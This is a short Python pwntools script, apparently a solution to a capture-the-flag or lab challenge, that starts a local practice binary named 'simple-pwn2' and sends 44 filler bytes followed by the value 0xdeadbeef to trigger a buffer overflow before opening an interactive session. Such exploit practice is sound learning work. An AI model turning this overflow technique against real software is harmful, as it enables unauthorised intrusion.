from pwn import *

p = process("./source/simple-pwn2")

p.sendline(b"A" * 44 + bytes.fromhex('deadbeef'))

p.interactive()
